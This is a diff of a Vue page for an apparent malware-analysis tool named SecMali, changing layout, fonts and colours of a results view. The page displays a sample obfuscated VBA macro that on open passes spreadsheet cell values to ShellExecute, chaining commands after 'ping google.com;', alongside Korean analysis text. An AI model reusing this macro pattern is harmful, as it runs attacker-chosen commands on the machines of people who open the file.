@@ -1,15 +1,17 @@
 <template>
    <q-page id="sub">
-    <div id='wrap'>
+    <div id="header">
       <div class="hero-banner">
         <div class="text-center preview-description fixed-top-center">
          <h1>SecMali</h1>
         </div>
        </div>
+    </div>
+    <div id='wrap'>
        <div class="flex flex-center">
     <q-splitter
       v-model="splitterModel"
-      style="height: 500px; width: 90%;"
+      style="height: 600px; width: 90%;"
     >
 
       <template v-slot:before>
@@ -21,8 +23,8 @@
           <template v-slot:before>
             <q-scroll-area style="height: 100%;">
             <div class="q-pa-md">
-              <div class="text-h4 q-mb-md" style="font-weight: bold;">발견된 위협</div>
-              <div class="q-my-md">파일명 : example.hwp<br>1. 매크로 발견<br>2. 의심스러운 실행 파일 발견</div>
+              <div class="text-h4 q-mb-md font" style="font-weight: bold;">발견된 위협</div>
+              <div class="q-my-md font" style="font-weight: 400; font-size:large;">파일명 : example.hwp<br>1. 매크로 발견<br>2. 의심스러운 실행 파일 발견</div>
             </div>
           </q-scroll-area>
           </template>
@@ -30,8 +32,8 @@
           <template v-slot:after>
             <q-scroll-area style="height: 100%;">
             <div class="q-pa-md">
-              <div class="text-h4 q-mb-md" style="font-weight: bold;">매크로 코드</div>
-              <div class="q-my-md">Private Sub Workbook_Open()<br>Dim g5 As String<br>Dim g6 As String<br><br>g5 = ""<br>g6 = ""<br><br>g5 = Cells(2, 7)  // $g$2<br>g6 = Cells(3, 7)  // $g$3<br><br>lyDdMyWVp = wJmdrV(g5, g6)<br><br>End Sub<br><br>Function wJmdrV(eeeew As String, ifgkdfg As String)<br><br>Dim DGjG() As Variant<br>   ReDim DGjG(4)<br>   DGjG(0) = "p" + ifgkdfg<br>   DGjG(1) = "ping google.com;" + eeeew<br>   DGjG(2) = ""<br>   DGjG(3) = ""<br>   DGjG(4) = 0<br>Dim sSVno As Object<br><br>Set sSVno = CreateObject(invuKAT())<br><br>zsEd = CallByName(sSVno, RijxuydD(" S h e l l E x e c u t e "), VbMethod, DGjG(0), DGjG(1), DGjG(2), DGjG(3), DGjG(4))
+              <div class="text-h4 q-mb-md font" style="font-weight: bold;">매크로 코드</div>
+              <div class="q-my-md font2" style="font-weight: 400; font-size:large;">Private Sub Workbook_Open()<br>Dim g5 As String<br>Dim g6 As String<br><br>g5 = ""<br>g6 = ""<br><br>g5 = Cells(2, 7)  // $g$2<br>g6 = Cells(3, 7)  // $g$3<br><br>lyDdMyWVp = wJmdrV(g5, g6)<br><br>End Sub<br><br>Function wJmdrV(eeeew As String, ifgkdfg As String)<br><br>Dim DGjG() As Variant<br>   ReDim DGjG(4)<br>   DGjG(0) = "p" + ifgkdfg<br>   DGjG(1) = "ping google.com;" + eeeew<br>   DGjG(2) = ""<br>   DGjG(3) = ""<br>   DGjG(4) = 0<br>Dim sSVno As Object<br><br>Set sSVno = CreateObject(invuKAT())<br><br>zsEd = CallByName(sSVno, RijxuydD(" S h e l l E x e c u t e "), VbMethod, DGjG(0), DGjG(1), DGjG(2), DGjG(3), DGjG(4))
 
 
 
@@ -62,8 +64,8 @@
       <template v-slot:after>
         <q-scroll-area style="height: 100%;">
         <div class="q-pa-md">
-          <div class="text-h4 q-mb-md" style="font-weight: bold;">매크로 분석 결과</div>
-          <div class="q-my-md">이 코드는 Microsoft Word 문서를 열 때 특정 동작을 수행하는 VBA (Visual Basic for Applications) 코드입니다.<br><br>
+          <div class="text-h4 q-mb-md font" style="font-weight: bold;">매크로 분석 결과</div>
+          <div class="q-my-md font" style="font-weight: 400; font-size:large;">이 코드는 Microsoft Word 문서를 열 때 특정 동작을 수행하는 VBA (Visual Basic for Applications) 코드입니다.<br><br>
 
 Document_Open()은 문서가 열릴 때 실행되는 매크로입니다. 이 함수 내에서는 세 가지 함수인 asfwefsadfasfsadf(), asfwqfasfsdafas(), eifhhdfasfiedf()를 호출합니다.<br><br>
 
@@ -97,13 +99,15 @@ export default {
 }
 </script>
 <style scoped>
-.sub {
-  max-height: 100%;
-}
 
+
+#header {
+  margin: 0 auto;
+  background-color: #383f6d;
+}
 .hero-banner {
   width: 98%;
-    color: #131313;
+    color: white;
     text-align: center;
     padding: 20px 0;
     font-weight: bold;
@@ -111,8 +115,8 @@ export default {
 }
 .preview-description h1 {
     margin: 10px;
-    -webkit-text-fill-color: #383F6D;
-    -webkit-text-stroke: 3px #383F6D;
+    -webkit-text-fill-color: white;
+    -webkit-text-stroke: 3px white;
     font-size: 55px;
     font-family: 'Oxygen', sans-serif;
     text-transform: uppercase;
@@ -125,8 +129,20 @@ body #wrap h1 {
   width: 100%;
   line-height: 1.2;
   padding: 10px 0;
-  color: #383F6D;
+  color: white;
   font-weight: bold;
+}
+
+#wrap {
+  margin-top: 50px;
+}
+
+.font{  
+  font-family: 'Noto Sans KR', 'sans-serif';
+}
+
+.font2 {
+  font-family: 'IBM Plex Mono';
 }
 
 
